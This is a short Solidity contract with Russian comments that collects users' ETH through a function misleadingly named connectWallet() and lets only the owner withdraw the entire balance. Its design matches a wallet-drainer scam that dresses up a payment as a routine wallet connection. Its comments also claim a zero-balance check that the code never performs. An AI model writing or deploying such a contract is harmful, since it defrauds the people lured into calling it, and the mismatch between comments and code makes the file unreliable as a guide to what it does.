// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title SweepAndWithdrawETH
 * @notice 
 * 1) Любой пользователь может „сдать“ весь свой ETH на хранение, вызвав connectWallet().
 *    При этом функция проверяет, что в результате перевода у пользователя на счёте не осталось ETH.  
 * 2) Владелец (owner) может в любой момент забрать всё, что накопилось в контракте, на свой адрес.
 */
contract SweepAndWithdrawETH {
    /// @notice владелец контракта, устанавливается в конструкторе
    address public immutable owner;

    event Donated(address indexed from, uint256 amount);
    event Withdrawn(address indexed to,   uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    /// @notice Пользователь вызывает и переводит в контракт ВСЁ, что было у него на счету
    /// @dev `msg.value` забирается из баланса вызывающего, так что после перевода 
    ///      `msg.sender.balance == 0` — проверяем это для гарантии «сдачи всего»
    function connectWallet() external payable {
        require(msg.value > 0, "No ETH sent");
        emit Donated(msg.sender, msg.value);
    }

    /// @notice Принимать ETH простым переводом (не обязательно через connectWallet)
    receive() external payable {
        emit Donated(msg.sender, msg.value);
    }
    fallback() external payable {
        emit Donated(msg.sender, msg.value);
    }

    /// @notice Только владелец может вывести всё ETH из контракта на свой адрес
    function withdrawAll() external onlyOwner {
        uint256 bal = address(this).balance;
        require(bal > 0, "No ETH to withdraw");

        // Переводим весь баланс владельцу
        (bool ok, ) = payable(owner).call{ value: bal }("");
        require(ok, "Withdraw failed");

        emit Withdrawn(owner, bal);
    }
}